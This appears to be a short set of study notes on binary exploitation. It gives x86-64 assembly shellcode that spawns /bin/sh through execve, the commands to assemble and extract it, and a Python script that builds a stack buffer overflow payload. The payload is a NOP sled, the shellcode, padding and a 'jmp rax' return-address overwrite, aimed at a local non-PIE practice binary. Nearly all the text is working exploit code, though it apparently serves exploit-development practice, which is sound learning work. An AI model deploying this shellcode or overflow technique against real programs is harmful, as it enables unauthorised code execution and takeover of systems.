# Shell code

- https://shell-storm.org/shellcode/index.html

```nasm
global _start
_start:
	xor rax, rax                ; '\0'
	push rax
	mov rax, 0x68732f2f6e69622f ; "/bin//sh"
	push rax
	push rsp
	pop rdi                     ; arg1: "/bin//sh"
	xor rsi, rsi                ; arg2: 0
	xor rdx, rdx                ; arg3: 0
	xor rax, rax
	add rax, 59                 ; execve("/bin//sh", NULL, NULL)
	syscall

; nasm -o shellcode.o shellcode.nasm -f elf64
; ld -o shellcode shellcode.o
; objcopy -O binary -j .text shellcode shellcode.bin
; xxd -i -n code ./shellcode.bin
```

## exploit code

```python
#!/usr/bin/env python3
import sys
shellcode = bytes([
  0x48, 0x31, 0xc0, 0x50, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
  0x73, 0x68, 0x50, 0x54, 0x5f, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x48,
  0x31, 0xc0, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05
])
nops = b'\x90'*32
# canonial: 0x0000_0000_0000_0000 - 0x0000_7fff_ffff_ffff
#
# <jmp rax exploit>
# pwndbg> search --asm 'jmp rax'
#
# libc.so.6       0x7ffff7e09bb8 jmp rax
# addr_sc = 0x7ffff7e09bb8  # jmp rax
#
# vulnerable_nopie 0x4010cc jmp rax
addr_sc = 0x4010cc  # jmp rax
offset = 256
junk = nops
junk += shellcode
junk += b'A'*(offset-len(nops)-len(shellcode))
junk += b'B'*8  # RBP
junk += addr_sc.to_bytes(8, 'little')  # RIP
sys.stdout.buffer.write(junk)
```
